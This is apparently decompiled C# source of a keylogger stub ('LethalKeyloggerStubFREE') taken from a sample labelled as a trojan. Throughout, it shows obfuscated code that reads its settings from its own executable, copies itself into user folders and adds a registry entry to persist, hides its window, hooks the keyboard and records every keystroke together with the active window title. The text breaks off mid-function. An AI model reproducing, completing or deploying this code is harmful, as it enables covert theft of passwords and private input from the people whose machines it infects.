// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LethalKeyloggerStubFREE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 12B6E305-10BE-45CE-A4E6-EBEF8841AF5F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Blocker.jfqj-708a942c0b713e29b57a87ef2efb203acee5abacdbcae14c1d72b2d548d0b9f8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0003
{
  [DesignerGenerated]
  internal class \u0001 : Form
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private IContainer \u0001;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer \u0002;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer \u0003;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer \u0004;
    private TextBox \u0005;
    private TextBox \u0006;
    private TextBox \u0007;
    private TextBox \u0008;
    private TextBox \u000E;
    private TextBox \u000F;
    private TextBox \u0010;
    private CheckBox \u0011;
    private CheckBox \u0012;
    private CheckBox \u0013;
    private CheckBox \u0014;
    private CheckBox \u0015;
    private TextBox \u0016;
    private TextBox \u0017;
    private TextBox \u0018;
    private TextBox \u0019;
    private CheckBox \u001A;
    private TextBox \u001B;
    private Random \u001C;
    private string \u001D;
    private string \u001E;
    private string \u001F;
    private string \u007F;
    private string \u0080;
    private string \u0081;
    private string \u0082;
    private string \u0083;
    private string \u0084;
    private string \u0086;
    private string \u0087;
    private string \u0088;
    private string \u0089;
    private string \u008A;
    private string \u008B;
    private string \u008C;
    private string \u008D;
    private string \u008E;
    private string \u008F;
    private string \u0090;
    private string \u0091;
    private string \u0092;
    private string \u0093;
    private string \u0094;
    private string \u0095;
    private string \u0096;
    private string \u0097;
    private string \u0098;
    private string \u0099;
    [AccessedThroughProperty("kbHook")]
    private \u0003.\u0001.\u0001 \u009A;
    private bool \u009B;
    private StreamWriter \u009C;

    public \u0001()
    {
      \u0003.\u0001 obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0002));
      this.\u0005 = new TextBox();
      this.\u0006 = new TextBox();
      this.\u0007 = new TextBox();
      this.\u0008 = new TextBox();
      this.\u000E = new TextBox();
      this.\u000F = new TextBox();
      this.\u0010 = new TextBox();
      this.\u0011 = new CheckBox();
      this.\u0012 = new CheckBox();
      this.\u0013 = new CheckBox();
      this.\u0014 = new CheckBox();
      this.\u0015 = new CheckBox();
      this.\u0016 = new TextBox();
      this.\u0017 = new TextBox();
      this.\u0018 = new TextBox();
      this.\u0019 = new TextBox();
      this.\u001A = new CheckBox();
      this.\u001B = new TextBox();
      this.\u001C = new Random();
      this.\u001D = Path.GetFileName(Application.ExecutablePath);
      this.kbHook = new \u0003.\u0001.\u0001();
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0002()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer2 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer3 = new System.Windows.Forms.Timer(this.\u0001);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(4, 0);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = \u0003.\u0001.\u0001(234);
      this.Text = \u0003.\u0001.\u0001(243);
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this.\u0002;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        \u0003.\u0001 obj = this;
        EventHandler eventHandler = new EventHandler((object) obj, __vmethodptr(obj, \u0004));
        if (this.\u0002 != null)
          this.\u0002.Tick -= eventHandler;
        this.\u0002 = value;
        if (this.\u0002 == null)
          return;
        this.\u0002.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this.\u0003;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        \u0003.\u0001 obj = this;
        EventHandler eventHandler = new EventHandler((object) obj, __vmethodptr(obj, \u0003));
        if (this.\u0003 != null)
          this.\u0003.Tick -= eventHandler;
        this.\u0003 = value;
        if (this.\u0003 == null)
          return;
        this.\u0003.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this.\u0004;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        \u0003.\u0001 obj = this;
        EventHandler eventHandler = new EventHandler((object) obj, __vmethodptr(obj, \u0005));
        if (this.\u0004 != null)
          this.\u0004.Tick -= eventHandler;
        this.\u0004 = value;
        if (this.\u0004 == null)
          return;
        this.\u0004.Tick += eventHandler;
      }
    }

    private void \u0002(object sender, EventArgs e)
    {
      string Delimiter = \u0003.\u0001.\u0001(256);
      try
      {
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression);
        FileSystem.FileClose(1);
        string[] strArray = Strings.Split(Expression, Delimiter);
        this.\u0006.Text = strArray[1];
        this.\u0007.Text = strArray[2];
        if (Operators.CompareString(strArray[8], \u0003.\u0001.\u0001(277), false) == 0)
        {
          this.\u0011.Checked = true;
          this.\u0081 = strArray[4];
          this.\u0083 = strArray[6];
          this.\u0082 = strArray[5];
        }
        this.\u001B.Text = strArray[7];
        if (Operators.CompareString(strArray[9], \u0003.\u0001.\u0001(290), false) == 0)
          this.\u0014.Checked = true;
        if (Operators.CompareString(strArray[10], \u0003.\u0001.\u0001(303), false) == 0)
          this.\u0012.Checked = true;
        if (Operators.CompareString(strArray[13], \u0003.\u0001.\u0001(316), false) == 0)
        {
          this.\u001A.Checked = true;
          this.\u008C = strArray[15];
        }
        this.\u008B = strArray[14];
        this.\u008D = strArray[16];
        this.\u008E = strArray[17];
        this.\u008F = strArray[18];
        this.\u0090 = strArray[19];
        this.\u0091 = strArray[20];
        this.\u0092 = strArray[21];
        this.\u0093 = strArray[22];
        this.\u0094 = strArray[23];
        this.\u0095 = strArray[24];
        this.\u0096 = strArray[25];
        this.\u0097 = strArray[26];
        this.\u0098 = strArray[27];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName)).Length > 1)
        Application.Exit();
      if (Operators.CompareString(this.\u0098, \u0003.\u0001.\u0001(325), false) == 0)
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(\u0003.\u0001.\u0001(330)), false) == 0)
            processes[index].Kill();
          checked { ++index; }
        }
      }
      if (Operators.CompareString(this.\u008D, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u008E, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u008F, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0090, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0091, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0092, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0093, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0094, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0095, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0096, \u0003.\u0001.\u0001(325), false) == 0 | Operators.CompareString(this.\u0097, \u0003.\u0001.\u0001(325), false) == 0)
      {
        this.Timer3.Interval = 1000;
        this.Timer3.Start();
      }
      if (this.\u0015.Checked)
        this.\u0018.Text = Environment.UserName;
      if (this.\u0012.Checked)
        this.\u0017.Text = Environment.MachineName;
      if (\u0003.\u0003.Settings.runonce)
      {
        \u0003.\u0003.Settings.runonce = false;
        if (this.\u0011.Checked && Operators.CompareString(this.\u0082, \u0003.\u0001.\u0001(343), false) == 0)
        {
          int num = (int) Interaction.MsgBox((object) this.\u0081, MsgBoxStyle.Exclamation, (object) this.\u0083);
        }
        if (this.\u001A.Checked)
        {
          try
          {
            string fileName = Path.GetFileName(Application.ExecutablePath);
            if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(356), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(435), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(452), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(461), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(474), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(483), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(492), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(501), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(514), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
            else if (Operators.CompareString(this.\u008C, \u0003.\u0001.\u0001(523), false) == 0)
            {
              string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
              \u0002.\u0003.Computer.FileSystem.CopyFile(Application.ExecutablePath, folderPath + \u0003.\u0001.\u0001(369) + fileName, true);
              Registry.CurrentUser.OpenSubKey(\u0003.\u0001.\u0001(374), true).SetValue(this.\u008B, (object) (folderPath + \u0003.\u0001.\u0001(369) + fileName));
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      this.Timer1.Start();
      this.Timer2.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.\u001B.Text) * 60.0 * 1000.0)));
      this.Timer2.Start();
      this.Visible = false;
      this.Hide();
      this.ShowInTaskbar = false;
      \u0003.\u0003.Settings.Save();
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002();

    [DllImport("USER32", EntryPoint = "GetKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(long vKey);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string \u0002()
    {
      string lpString = new string(char.MinValue, 100);
      \u0003.\u0001.\u0002(\u0003.\u0001.\u0002(), ref lpString, 100);
      lpString = lpString.Substring(0, checked (Strings.InStr(lpString, \u0003.\u0001.\u0001(532)) - 1));
      return lpString;
    }

    private virtual \u0003.\u0001.\u0001 kbHook
    {
      [DebuggerNonUserCode] get => this.\u009A;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        \u0003.\u0001 TargetObject1 = this;
        \u0003.\u0001.\u0001.\u0003 obj1 = new \u0003.\u0001.\u0001.\u0003((object) TargetObject1, __vmethodptr(TargetObject1, \u0003));
        \u0003.\u0001 TargetObject2 = this;
        \u0003.\u0001.\u0001.\u0004 obj2 = new \u0003.\u0001.\u0001.\u0004((object) TargetObject2, __vmethodptr(TargetObject2, \u0002));
        if (this.\u009A != null)
          goto label_4;
label_2:
        this.\u009A = value;
        if (this.\u009A == null)
          return;
        \u0003.\u0001.\u0001.KeyDown += obj1;
        \u0003.\u0001.\u0001.KeyUp += obj2;
        return;
label_4:
        \u0003.\u0001.\u0001.KeyDown -= obj1;
        \u0003.\u0001.\u0001.KeyUp -= obj2;
        goto label_2;
      }
    }

    private void \u0002(Keys Key)
    {
    }

    private void \u0003(Keys Key)
    {
      if (!this.Timer1.Enabled)
        return;
      if (\u0003.\u0001.\u0003(16L) != 0)
        this.\u009B = true;
      if (Operators.CompareString(this.\u0099, this.\u0002(), false) != 0)
      {
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + \u0003.\u0001.\u0001(537) + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      if (Key == Keys.A)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(546);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(551);
        }
      }
      else if (Key == Keys.B)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(556);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(561);
        }
      }
      else if (Key == Keys.C)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(566);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(571);
        }
      }
      else if (Key == Keys.D)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(576);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(581);
        }
      }
      else if (Key == Keys.E)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(586);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(591);
        }
      }
      else if (Key == Keys.F)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(596);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(601);
        }
      }
      else if (Key == Keys.G)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(606);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(611);
        }
      }
      else if (Key == Keys.H)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(616);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(621);
        }
      }
      else if (Key == Keys.I)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(626);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(631);
        }
      }
      else if (Key == Keys.J)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(636);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(641);
        }
      }
      else if (Key == Keys.K)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(646);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(651);
        }
      }
      else if (Key == Keys.L)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(656);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(661);
        }
      }
      else if (Key == Keys.M)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(666);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(671);
        }
      }
      else if (Key == Keys.N)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(676);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(681);
        }
      }
      else if (Key == Keys.O)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(686);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(691);
        }
      }
      else if (Key == Keys.P)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(696);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(701);
        }
      }
      else if (Key == Keys.Q)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(706);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(711);
        }
      }
      else if (Key == Keys.R)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(716);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(721);
        }
      }
      else if (Key == Keys.S)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(726);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(731);
        }
      }
      else if (Key == Keys.T)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(736);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(741);
        }
      }
      else if (Key == Keys.U)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(746);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(751);
        }
      }
      else if (Key == Keys.V)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(756);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(761);
        }
      }
      else if (Key == Keys.W)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(766);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(771);
        }
      }
      else if (Key == Keys.X)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(776);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(781);
        }
      }
      else if (Key == Keys.Y)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(786);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(791);
        }
      }
      else if (Key == Keys.Z)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(796);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(801);
        }
      }
      else if (Key == Keys.D0)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(806);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(811);
        }
      }
      else if (Key == Keys.D1)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(816);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(821);
        }
      }
      else if (Key == Keys.D2)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(826);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(831);
        }
      }
      else if (Key == Keys.D3)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(836);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(841);
        }
      }
      else if (Key == Keys.D4)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(846);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(851);
        }
      }
      else if (Key == Keys.D5)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(856);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(861);
        }
      }
      else if (Key == Keys.D6)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(866);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(871);
        }
      }
      else if (Key == Keys.D7)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(876);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(881);
        }
      }
      else if (Key == Keys.D8)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(886);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(891);
        }
      }
      else if (Key == Keys.D9)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(896);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(901);
        }
      }
      else if (Key == Keys.OemSemicolon)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(906);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(911);
        }
      }
      else if (Key == Keys.OemPeriod)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(916);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(921);
        }
      }
      else if (Key == Keys.OemQuotes)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(926);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(931);
        }
      }
      else if (Key == Keys.OemOpenBrackets)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(936);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(941);
        }
      }
      else if (Key == Keys.OemCloseBrackets)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(946);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(951);
        }
      }
      else if (Key == Keys.Oemcomma)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(956);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(961);
        }
      }
      else if (Key == Keys.OemMinus)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(966);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(971);
        }
      }
      else if (Key == Keys.Oemplus)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(976);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(981);
        }
      }
      else if (Key == Keys.OemQuestion)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(986);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(991);
        }
      }
      else if (Key == Keys.OemPipe)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(996);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(369);
        }
      }
      else if (Key == Keys.Oemtilde)
      {
        if (this.\u009B)
        {
          this.\u0005.Text += \u0003.\u0001.\u0001(1001);
          this.\u009B = false;
        }
        else
        {
          if (this.\u009B)
            return;
          this.\u0005.Text += \u0003.\u0001.\u0001(1006);
        }
      }
      else if (Key == Keys.Tab)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1011);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
        this.\u0005.Text = this.\u0005.Text + this.\u0099 + \u0003.\u0001.\u0001(537);
      }
      else if (Key == Keys.Subtract)
        this.\u0005.Text += \u0003.\u0001.\u0001(971);
      else if (Key == Keys.Capital)
        this.\u0005.Text += \u0003.\u0001.\u0001(1020);
      else if (Key == Keys.Space)
        this.\u0005.Text += \u0003.\u0001.\u0001(1029);
      else if (Key == Keys.Add)
        this.\u0005.Text += \u0003.\u0001.\u0001(976);
      else if (Key == Keys.Back)
        this.\u0005.Text += \u0003.\u0001.\u0001(1034);
      else if (Key == Keys.LControlKey)
      {
        this.\u0005.Text += \u0003.\u0001.\u0001(1039);
        if (Operators.CompareString(this.\u0099, this.\u0002(), false) == 0)
          return;
        this.\u0099 = this.\u0002();
